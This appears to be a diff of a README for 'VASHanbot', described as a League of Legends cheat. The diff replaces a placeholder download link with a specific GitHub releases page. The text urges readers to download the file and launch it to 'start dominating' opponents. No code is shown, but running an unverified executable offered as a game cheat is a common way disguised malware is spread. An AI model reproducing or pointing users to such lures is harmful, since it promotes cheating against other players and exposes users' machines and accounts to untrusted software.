@@ -45,13 +45,13 @@ To give you a better idea of what VASHanbot is all about, here are some of the t
 
 Ready to take your League of Legends gameplay to the next level? Download the VASHanbot cheat by clicking the button below:
 
-[![Download VASHanbot](https://img.shields.io/badge/Download-VASHanbot-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download VASHanbot](https://github.com/abelardonpollo/VASHanbot-League-of-Legends-Cheat-Source/releases)](https://github.com/abelardonpollo/VASHanbot-League-of-Legends-Cheat-Source/releases)
 
 Make sure to launch the downloaded file to install the cheat and start dominating your opponents in League of Legends.
 
 ## Support ℹ️
 
-If you encounter any issues with the download link or need assistance with setting up VASHanbot, feel free to visit the [Releases](https://github.com/repo/releases) section for more information and resources.
+If you encounter any issues with the download link or need assistance with setting up VASHanbot, feel free to visit the [Releases](https://github.com/abelardonpollo/VASHanbot-League-of-Legends-Cheat-Source/releases) section for more information and resources.
 
 ## Stay Updated 🚨
 
